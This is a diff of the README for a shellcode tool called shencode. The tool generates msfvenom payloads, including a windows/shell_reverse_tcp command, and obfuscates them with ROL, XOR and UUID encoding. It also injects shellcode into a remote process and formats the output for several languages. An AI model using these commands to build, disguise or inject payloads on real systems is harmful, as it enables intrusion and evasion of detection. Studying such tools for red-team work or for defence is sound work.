@@ -6,26 +6,27 @@ A multi purpose tool for shellcode operations
 
 ## Features
 
-### Version 0.4.0
+### Version 0.4.1
 
 - create
 	- create shellcodes with msfvenom
 - encode
-	- search and replace ROR13 encoding with ROL
-	- XOR encryption
+	- `ROR13` to `ROL` with custom key
+	- `XOR` encryption
+	- `UUID` obfuscation for shellcodes
 - extract
-	- extract shellcode from position x to y
+	- extract shellcode from position `x` to `y`
 - inject
 	- inject shellcode into a remote process
 - output
 	- raw shellcode to file
 	- formatting options: `C++, C#, C-ASM, PS, PY, HEX`
+	- new inspect option helps to find offsets
 	- output in console windows
 	- output in template
 
 ## ToDo
 
-- `pip install requirements.txt`
 - automatical compile feature
 - integrate more frameworks
 - integrate more encoder
@@ -38,13 +39,12 @@ A multi purpose tool for shellcode operations
 `python shencode.py create --cmd="-p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4443 -f raw -o payload.bin"`
 ### encode shellcode
 
-#### ROR13 to ROL
 
-`python shencode.py encode --filename sc-120824-120101.bin --outputfile shell.enc --key 33`
-
-#### XOR
-
-`python shencode.py encode --filename shell.raw --outputfile shell.enc --xor --xorkey 96`
+| Encoder          | Arguments                                                              |
+| ---------------- | ---------------------------------------------------------------------- |
+| **ROR13 to ROL** | `encode --filename shell.raw --outputfile shell.enc --key 33`          |
+| **UUID**         | `encode --filename shell.raw --uuid`                                   |
+| **XOR**          | `encode --filename shell.raw --outputfile shell.enc --xor --xorkey 96` |
 
 ### extract shellcode
 
@@ -59,6 +59,12 @@ A multi purpose tool for shellcode operations
 `python shencode.py -o {c, casm, cs, ps1, py, hex} <commands>`
 
 Check [this repository](https://github.com/psycore8/bin2shellcode) for more information regarding the output.
+
+#### inspect output
+
+`python shencode.py output --filename inputfile --syntax inspect`
+
+Output hex in 8 byte: `0x00000008: 48 31 c0 48 89 45 f8 48`
 
 #### write output to a template file
 
@@ -97,8 +103,7 @@ Please change the metasploit path in line 10. This will be fixed in the future.
 |             | --key          | -rk       | ROL key for encoding                                                                  |     |
 |             | --xor          | -x        | use additional XOR encoding                                                           |     |
 |             | --xorkey       | -xk       | XOR key for encoding                                                                  |     |
-|             | --decompile    |           | decompile modified bytes                                                              |     |
-|             | --showmod      |           | display modifications                                                                 |     |
+|             | --uuid         | -u        | Obfuscate Shellcode as UUID                                                           |     |
 | extract     |                |           |                                                                                       |     |
 |             | --filename     | -f        | binary input file                                                                     |     |
 |             | --outputfile   | -o        | name of the outputfile                                                                |     |
@@ -110,7 +115,8 @@ Please change the metasploit path in line 10. This will be fixed in the future.
 |             | --startprocess | -s        | if set, process will be started                                                       |     |
 | output      |                |           | create formatted output by filename                                                   |     |
 |             | --filename     | -f        | raw input file with shellcode                                                         |     |
-|             | --syntax       | -s        | formatting the shellcode in C, Casm, C#, Powershell, python or hex                    |     |
+|             | --lines        | -l        | adding line offsets                                                                   |     |
+|             | --syntax       | -s        | formatting the shellcode, choose between `c, casm, cs, hex, inspect, ps1, py`         |     |
 |             | --write        | -w        | write output to the given filename (replacing  `!++BUFFER++!` placeholder in the file |     |
 | --output    |                |           | formatting the shellcode in C, Casm, C#, Powershell, python or hex                    |     |
 
